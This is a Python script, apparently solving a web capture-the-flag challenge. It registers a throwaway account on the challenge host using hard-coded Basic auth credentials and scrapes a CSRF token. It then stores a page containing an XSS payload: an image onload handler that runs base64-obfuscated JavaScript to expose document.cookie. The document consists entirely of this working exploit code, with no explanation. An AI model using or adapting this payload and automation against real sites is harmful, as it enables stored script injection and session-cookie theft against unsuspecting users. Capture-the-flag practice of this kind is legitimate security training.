import requests
import uuid

# Create new user
s = requests.Session()

username = str(uuid.uuid4()).replace('-', '')
password = str(uuid.uuid4())

headers = {
    'Authorization': 'Basic emVuaGFjazozdjJZbmJBeXdmV1phYjNh',
}

reg_data = {
    'username': username,
    'password': password,
    'password_confirmation': password,
}

print("Username: %s\nPassword: %s" % (username, password))
print()

s.post('http://render.ctf.emilionunes.it/registration.php', headers=headers, data=reg_data)

new_page_text = s.get('http://render.ctf.emilionunes.it/new_page.php', headers=headers).text
csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
eploit = '''
<img
src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
onload="eval(atob('JCgnYm9keScpLmh0bWwoZG9jdW1lbnQu' + 'Y29va2llKTs='))"
>
'''

eploit_id = str(uuid.uuid4())
page_data = {
    'name': 'eploit_' + eploit_id,
    'content': eploit,
    'csrf_token': csrf_token,
}

response = s.post('http://render.ctf.emilionunes.it/new_page.php', headers=headers, data=page_data)
print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())